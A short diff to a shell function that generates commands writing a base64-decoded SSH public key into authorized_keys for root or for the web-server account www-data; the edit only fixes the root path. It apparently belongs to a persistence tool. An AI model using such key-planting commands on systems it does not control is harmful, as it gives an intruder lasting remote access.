@@ -4,7 +4,7 @@ keyout()
 {
         if [ "$name" = "root" ];
         then
-                echo "echo \"$b64pkey\" | base64 -d > /$name/.ssh/authorized_keys && chmod 600 /$name/.ssh/authorized_keys"
+                echo "echo \"$b64pkey\" | base64 -d > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
         elif [ "$name" = "www-data" ];
         then
                 echo "echo \"$b64pkey\" | base64 -d > /var/www/.ssh/authorized_keys && chmod 600 /var/www/.ssh/authorized_keys"
